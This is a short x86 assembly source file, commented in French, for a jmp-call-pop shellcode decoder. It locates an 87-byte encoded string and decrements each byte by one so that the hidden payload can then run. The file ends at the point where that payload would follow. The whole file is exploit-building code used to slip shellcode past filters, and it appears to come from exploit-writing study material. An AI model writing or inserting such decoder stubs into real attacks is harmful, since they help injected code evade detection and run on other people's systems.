BITS 32	
	
	jmp short three
	
	one:
	 pop esi	
	 xor ecx, ecx
	 mov cl, 87			; On place dans %cl la taille de notre shellcode

	two:
	 sub byte [esi + ecx -1], 1	; on décrémente de 1 notre chaîne
	 sub cl,1			; on décrémente de 1 la taille de la chaîne
	 jnz two			; on test si %cl est à 0 (si c'est la fin de notre chaîne)
	 jmp short four			; si c'est le cas on sort de la boucle

	three:
	 call one

	four: